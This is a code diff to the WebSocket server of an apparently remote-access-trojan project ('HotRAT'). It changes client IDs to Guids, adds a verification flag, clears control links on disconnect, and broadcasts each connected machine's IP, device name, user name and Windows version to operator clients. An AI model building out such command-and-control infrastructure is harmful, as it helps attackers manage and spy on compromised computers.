@@ -1,4 +1,5 @@
 ﻿using HotRAT.Server;
+using HotRAT.Server.Models;
 using Newtonsoft.Json;
 using System;
 using System.Collections.Concurrent;
@@ -15,7 +16,7 @@ namespace HotRAT.WSServer.Models
     public class WebSocketServer
     {
         private readonly TcpListener _listener;
-        public readonly ConcurrentDictionary<string, wsClientConnection> _clients = new();
+        public readonly ConcurrentDictionary<Guid, wsClientConnection> _clients = new();
         
         public WebSocketServer(IPAddress ip, int port)
         {
@@ -35,7 +36,7 @@ namespace HotRAT.WSServer.Models
 
         private async Task HandleClientAsync(TcpClient tcpClient)
         {
-            string clientId = Guid.NewGuid().ToString();
+            var clientId = Guid.NewGuid();
             Console.WriteLine();
             Runtimes.CWrite($"新客户端连接: {clientId}", ConsoleColor.Green, true);
             using NetworkStream stream = tcpClient.GetStream();
@@ -92,6 +93,16 @@ namespace HotRAT.WSServer.Models
                 _clients.TryRemove(clientId, out _);
                 tcpClient.Close();
                 Runtimes.CWrite($"[{clientId}] 断开连接", ConsoleColor.Red,true);
+                foreach (var client in Runtimes._clients.Values)
+                {
+                    foreach (var control in client.Controlled)
+                    {
+                        if(control == clientId)
+                        {
+                            client.DelControlled(control);
+                        }
+                    }
+                }
             }
         }
 
@@ -184,12 +195,40 @@ namespace HotRAT.WSServer.Models
                     deviceName = connects.Info.DeviceName,
                     userName = connects.Info.UserName,
                     version = connects.Info.WindowsVersion,
-                    time = connects.Info.ConnectTime
+                    time = connects.Info.ConnectTime,
+                    count = connects.Info.ControlCount
                 }).ToList()
             });
             foreach (var cons in Runtimes.WSserver._clients)
             {
                 _ = SendMessageAsync(cons.Value.Stream, info);
+            }
+        }
+
+        public static void UpdateSingleClient(ClientConnection changedClient)
+        {
+            var clientInfo = new
+            {
+                type = "CLIENTS",
+                data = new[]
+                {
+                    new
+                    {
+                        id = changedClient.ConnectionId,
+                        ip = changedClient.Info.IP,
+                        port = changedClient.Info.Port,
+                        deviceName = changedClient.Info.DeviceName,
+                        userName = changedClient.Info.UserName,
+                        version = changedClient.Info.WindowsVersion,
+                        time = changedClient.Info.ConnectTime,
+                        count = changedClient.Info.ControlCount
+                    }
+                }
+            };
+            var infoJson = JsonConvert.SerializeObject(clientInfo);
+            foreach (var cons in Runtimes.WSserver._clients)
+            {
+                _ = SendMessageAsync(cons.Value.Stream, infoJson);
             }
         }
 
@@ -210,11 +249,12 @@ namespace HotRAT.WSServer.Models
 
         public class wsClientConnection
         {
-            public string Id { get; }
+            public Guid Id { get; }
+            public bool Verified { get; set; } = false;
             public TcpClient TcpClient { get; }
             public NetworkStream Stream { get; }
 
-            public wsClientConnection(string id, TcpClient tcpClient, NetworkStream stream)
+            public wsClientConnection(Guid id, TcpClient tcpClient, NetworkStream stream)
             {
                 Id = id;
                 TcpClient = tcpClient;
